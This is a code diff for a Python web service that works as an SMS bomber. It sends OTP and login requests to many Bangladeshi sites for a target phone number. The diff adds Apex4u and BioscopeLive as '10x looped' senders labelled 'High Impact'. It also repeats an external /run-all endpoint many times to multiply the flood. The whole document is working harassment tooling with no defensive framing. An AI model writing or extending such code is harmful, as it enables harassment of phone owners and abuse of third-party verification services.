@@ -73,7 +73,7 @@ def generate_fingerprint() -> str:
 
 
 # =====================================================================
-# 2. 🔁 10x LOOPED SERVICES (DNCRP, Otech, Amarbay, Mojaru)
+# 2. 🔁 10x LOOPED SERVICES (DNCRP, Otech, Amarbay, Mojaru, Apex4u, BioscopeLive)
 # =====================================================================
 
 def svc_dncrp(phone):
@@ -125,12 +125,39 @@ def svc_mojaru(phone):
     success_count = sum(1 for x in resps if x.get("status") == 200)
     return {"service": "Mojaru (10x Loop)", "status_code": 200 if success_count > 0 else 500, "success": success_count > 0, "response": f"Success: {success_count}/10", "details": resps}
 
+# 🆕 Apex4u (10x Loop)
+def svc_apex4u(phone):
+    headers = {"origin": "https://apex4u.com", "user-agent": "Mozilla/5.0", "content-type": "application/json"}
+    url = "https://api.apex4u.com/api/auth/login"
+    resps = []
+    for i in range(10):
+        try:
+            r = requests.post(url, json={"phoneNumber": get_local11(phone)}, headers=headers, timeout=DEFAULT_TIMEOUT)
+            resps.append({"attempt": i + 1, "status": r.status_code, "resp": parse_resp(r)})
+        except Exception as e:
+            resps.append({"attempt": i + 1, "error": str(e)})
+    success_count = sum(1 for x in resps if x.get("status") == 200)
+    return {"service": "Apex4u (10x Loop)", "status_code": 200 if success_count > 0 else 500, "success": success_count > 0, "response": f"Success: {success_count}/10", "details": resps}
+
+# 🆕 BioscopeLive (10x Loop)
+def svc_bioscopelive(phone):
+    headers = {"accept": "application/json", "content-type": "application/json", "origin": "https://www.bioscopeplus.com", "referer": "https://www.bioscopeplus.com/", "user-agent": "Mozilla/5.0"}
+    url = "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en"
+    resps = []
+    for i in range(10):
+        try:
+            r = requests.post(url, json={"number": get_e164(phone)}, headers=headers, timeout=DEFAULT_TIMEOUT)
+            resps.append({"attempt": i + 1, "status": r.status_code, "resp": parse_resp(r)})
+        except Exception as e:
+            resps.append({"attempt": i + 1, "error": str(e)})
+    success_count = sum(1 for x in resps if x.get("status") == 200)
+    return {"service": "BioscopeLive (10x Loop)", "status_code": 200 if success_count > 0 else 500, "success": success_count > 0, "response": f"Success: {success_count}/10", "details": resps}
+
 
 # =====================================================================
 # 3. VERIFIED ACTIVE SERVICES
 # =====================================================================
 
-# 🆕 PKLuck Verification
 def svc_pkluck(phone):
     url = "https://www.pkluck2.com/wps/verification/sms/register"
     payload = {
@@ -357,13 +384,6 @@ def svc_gpfwa(phone):
 # 4. SINGLE VERIFIED PROVIDERS
 # =====================================================================
 
-def call_bioscopelive(phone):
-    try:
-        r = requests.post("https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en", json={"number": get_e164(phone)}, headers={"accept": "application/json", "content-type": "application/json", "origin": "https://www.bioscopeplus.com", "referer": "https://www.bioscopeplus.com/", "user-agent": "Mozilla/5.0"}, timeout=DEFAULT_TIMEOUT)
-        return {"service": "BioscopeLive", "status_code": r.status_code, "success": r.status_code == 200, "response": parse_resp(r)}
-    except Exception as e:
-        return {"service": "BioscopeLive", "status_code": None, "success": False, "error": str(e)}
-
 def call_medha(phone):
     try:
         r = requests.post("https://developer.medha.info/api/send-otp", json={"phone": get_msisdn88(phone), "is_register": "1"}, headers={"User-Agent": "Dart/3.2 (dart:io)", "content-type": "application/json", "authorization": "Bearer"}, timeout=DEFAULT_TIMEOUT)
@@ -398,13 +418,6 @@ def call_bcsexamaid(phone):
         return {"service": "BCSExamAid", "status_code": r.status_code, "success": r.status_code == 200, "response": parse_resp(r)}
     except Exception as e:
         return {"service": "BCSExamAid", "status_code": None, "success": False, "error": str(e)}
-
-def call_apex4u(phone):
-    try:
-        r = requests.post("https://api.apex4u.com/api/auth/login", json={"phoneNumber": get_local11(phone)}, headers={"origin": "https://apex4u.com", "user-agent": "Mozilla/5.0", "content-type": "application/json"}, timeout=DEFAULT_TIMEOUT)
-        return {"service": "Apex4u", "status_code": r.status_code, "success": r.status_code == 200, "response": parse_resp(r)}
-    except Exception as e:
-        return {"service": "Apex4u", "status_code": None, "success": False, "error": str(e)}
 
 def call_shikho(phone):
     try:
@@ -664,9 +677,6 @@ def call_kotha(phone):
 # =====================================================================
 
 EXTERNAL_URL_APIS = [
-    "https://api3-sepia.vercel.app/send?phone=",
-    "https://api4-beta.vercel.app/send?phone=",
-    "https://api5-teal.vercel.app/send?phone=",
     "https://gxsend.vercel.app/run-all?phone=",
     "https://gxsend.vercel.app/run-all?phone=",
     "https://gxsend.vercel.app/run-all?phone=",
@@ -690,7 +700,14 @@ EXTERNAL_URL_APIS = [
     "https://gxsend.vercel.app/run-all?phone=",
     "https://gxsend.vercel.app/run-all?phone=",
     "https://gxsend.vercel.app/run-all?phone=",
-    "https://gxsend.vercel.app/run-all?phone="
+    "https://gxsend.vercel.app/run-all?phone=",
+    "https://gxsend.vercel.app/run-all?phone=",
+    "https://gxsend.vercel.app/run-all?phone=",
+    "https://gxsend.vercel.app/run-all?phone=",
+    "https://gxsend.vercel.app/run-all?phone=",
+    "https://gxsend.vercel.app/run-all?phone=",
+    "https://gxsend.vercel.app/run-all?phone=",
+    
 ]
 
 def send_external_custom_url(url_template, phone):
@@ -719,14 +736,16 @@ def send_external_custom_url(url_template, phone):
 # =====================================================================
 
 MASTER_SERVICES = {
-    # 🔁 10x Looped
+    # 🔁 10x Looped (High Impact)
     "dncrp": svc_dncrp,
     "otech": svc_otech,
     "amarbay": svc_amarbay,
     "mojaru": svc_mojaru,
+    "apex4u": svc_apex4u,             # 🔁 10x Looped Apex
+    "bioscope": svc_bioscopelive,      # 🔁 10x Looped Bioscope
 
     # 📱 Fast & Responsive Core Providers
-    "pkluck": svc_pkluck,          # 🆕 Newly Added PKLuck
+    "pkluck": svc_pkluck,
     "paperfly": svc_paperfly,
     "ostad": svc_ostad,
     "timezone": svc_timezone,
@@ -750,13 +769,11 @@ MASTER_SERVICES = {
     "gpfwa": svc_gpfwa,
 
     # 🚀 Single Providers
-    "bioscopelive": call_bioscopelive,
     "medha": call_medha,
     "deeptoplay": call_deeptoplay,
     "arogga_web": call_arogga_web,
     "cinematic_wap": call_cinematic_wap,
     "bcsexamaid": call_bcsexamaid,
-    "apex4u": call_apex4u,
     "shikho": call_shikho,
     "circlereseller": call_circlereseller,
     "bdtickets": call_bdtickets,
@@ -846,7 +863,7 @@ def home():
         "endpoints": {
             "/send?phone=017XXXXXXXX": "Fires all verified APIs concurrently",
             "/run-all?phone=017XXXXXXXX": "Alias for /send",
-            "/run?phone=017XXXXXXXX&apis=pkluck,paperfly,ostad,dncrp": "Runs selective APIs"
+            "/run?phone=017XXXXXXXX&apis=apex4u,bioscope,dncrp,pkluck": "Runs selective APIs"
         }
     })
 
@@ -877,7 +894,7 @@ def send_selected_route():
 
     local11 = get_local11(phone)
     if not local11 or len(local11) != 11:
-        return jsonify({"success": False, "error": "Invalid phone. Usage: /run?phone=017XXXXXXXX&apis=pkluck,paperfly,ostad"}), 400
+        return jsonify({"success": False, "error": "Invalid phone. Usage: /run?phone=017XXXXXXXX&apis=apex4u,bioscope"}), 400
 
     if isinstance(apis_param, list):
         keys = [str(x).strip() for x in apis_param]
